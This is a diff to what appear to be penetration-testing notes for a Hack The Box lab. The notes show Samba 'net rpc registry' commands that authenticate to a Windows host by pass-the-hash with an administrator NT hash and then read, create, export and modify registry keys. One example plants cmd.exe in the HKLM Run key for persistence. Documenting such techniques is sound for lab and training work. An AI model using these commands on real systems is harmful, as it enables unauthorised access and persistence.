@@ -406,28 +406,61 @@ Successfully deleted Service: test
 ### registry
 #### registry enumerate
 ```sh
-└─$ net rpc registry enumerate 'HKLM\' -U 'htb.local/administrator%32693b11e6aa90eb43d32c72a07ceea6' --pw-nt-hash -S 10.129.95.210 
-Keyname   = BCD00000000
-Modtime   = Sun, 17 Aug 2025 05:46:35 EDT
-
-Keyname   = HARDWARE
-Modtime   = Sun, 17 Aug 2025 05:46:31 EDT
-
-Keyname   = SAM
-Modtime   = Sun, 17 Aug 2025 05:46:37 EDT
-
-Keyname   = SECURITY
-Modtime   = Sun, 17 Aug 2025 05:46:37 EDT
-
-Keyname   = SOFTWARE
-Modtime   = Sun, 17 Aug 2025 05:46:36 EDT
-
-Keyname   = SYSTEM
-Modtime   = Sun, 17 Aug 2025 05:46:31 EDT
+└─$ net rpc registry enumerate 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run' -U 'htb.local/administrator%32693b11e6aa90eb43d32c72a07ceea6' --pw-nt-hash -S 10.129.95.210
+Valuename  = VMware User Process
+Type       = REG_SZ
+Value      = ""C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr"
 ```
 #### registry getvalue
 ```sh
 └─$ net rpc registry getvalue 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run' 'VMware User Process' -U 'htb.local/administrator%32693b11e6aa90eb43d32c72a07ceea6' --pw-nt-hash -S 10.129.95.210 
 Type       = REG_SZ
 Value      = ""C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr"
+```
+#### registry getvalueraw
+```sh
+└─$ net rpc registry getvalueraw 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run' 'VMware User Process' -U 'htb.local/administrator%32693b11e6aa90eb43d32c72a07ceea6' --pw-nt-hash -S 10.129.95.210 
+"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
+```
+#### registry createkey
+```sh
+└─$ net rpc registry createkey 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run\test' -U 'htb.local/administrator%32693b11e6aa90eb43d32c72a07ceea6' --pw-nt-hash -S 10.129.95.210 
+createkey created HKLM\Software\Microsoft\Windows\CurrentVersion\Run\test
+```
+#### registry deletekey
+```sh
+└─$ net rpc registry deletekey 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run\test' -U 'htb.local/administrator%32693b11e6aa90eb43d32c72a07ceea6' --pw-nt-hash -S 10.129.95.210
+
+```
+#### registry 
+```sh
+#  typeは、sz、multi_sz、dwordのうちのどれかが選べる
+└─$ net rpc registry setvalue 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run' 'test' 'SZ' 'C:\Windows\System32\cmd.exe' -U 'htb.local/administrator%32693b11e6aa90eb43d32c72a07ceea6' --pw-nt-hash -S 10.129.95.210 
+
+└─$ net rpc registry getvalue 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run' 'test' -U 'htb.local/administrator%32693b11e6aa90eb43d32c72a07ceea6' --pw-nt-hash -S 10.129.95.210                                
+Type       = REG_SZ
+Value      = "C:\Windows\System32\cmd.exe"
+```
+#### 
+```sh
+└─$ net rpc registry deletevalue 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run' 'test' -U 'htb.local/administrator%32693b11e6aa90eb43d32c72a07ceea6' --pw-nt-hash -S 10.129.95.210
+
+```
+#### registry export
+```sh
+└─$ net rpc registry export 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run' reg.txt -U 'htb.local/administrator%32693b11e6aa90eb43d32c72a07ceea6' --pw-nt-hash -S 10.129.95.210 
+                                                                                                                    
+└─$ cat reg.txt               
+Windows Registry Editor Version 5.00
+
+[HKLM\Software\Microsoft\Windows\CurrentVersion\Run]
+"VMware User Process"="\"C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe\" -n vmusr"
+;Local Variables:
+;coding: UTF-8
+;End:
+```
+#### registry save
+```sh
+└─$ net rpc registry save 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run' 'C:\Users\Public\reg' -U 'htb.local/administrator%32693b11e6aa90eb43d32c72a07ceea6' --pw-nt-hash -S 10.129.95.210 
+
 ```
